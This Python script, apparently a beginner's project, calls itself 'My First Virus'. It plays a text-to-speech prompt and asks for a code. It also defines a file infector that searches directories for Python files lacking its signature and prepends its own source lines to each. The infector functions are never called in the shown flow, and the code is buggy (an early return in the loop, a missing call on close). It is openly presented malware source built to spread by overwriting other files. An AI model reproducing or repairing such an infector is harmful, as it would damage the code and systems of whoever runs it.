import pyttsx3
import os

engine = pyttsx3.init()

engine.setProperty('rate', 150)
engine.setProperty('volume', 10)
def intro():
    x = input("Enter Your Name: ")
    engine.say("hello" + x)
    engine.runAndWait()
    safety_code = input("Enter four digit code (hint: Ripon College): ")
    return safety_code


def WillItInfect (safety_code):
    if safety_code == "1851":
        print("Your Computer Is safe Congrats!!!!!")
    else:
        Virus_infection()
        





def Virus_infection():
    engine.say("you are infected")
    engine.runAndWait()
    
    #make a signiture can be anything in order to ID the virus and seperate it from other file types
SIG = "My First Virus"
def find_a_path(route):
     #step one is to create an empty list for the virus
    infect = []
     #set a variable for returning the names of files in a directory path
    list_of_files = os.listdir(route)
    # use a for loop to determine if a file is a python file
    for name in list_of_files:
            #this searches to see if the file is a python file and if it is a python file if it is
            # infected or not if not it sets infected to false and lauches an infector in the form of another for loop
        if os.path.isdir(route+'/'+name):
            infect.extend(find_a_path(route+'/'+name))
        elif name[-3:] ==".py":
            infected = False
    #this looks for the SIG to dertermine if the virus has already affected the python file and if not it appends it
            for line in open(route+'/'+name):
                if SIG in line:
                    infected = True
                    break
            if infected == False:
                infect.append(route+'/'+name)
        return infect
def spread(infect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i >= 0 and i < 39:
            virusstring += line
    virus.close
    for name in infect:
        f = open(name)
        temp = f.read()
        f.close()
        f = open(name, "w")
        f.write(virusstring + temp)
        f.close()
    

       




safety_code = intro()
WillItInfect(safety_code)


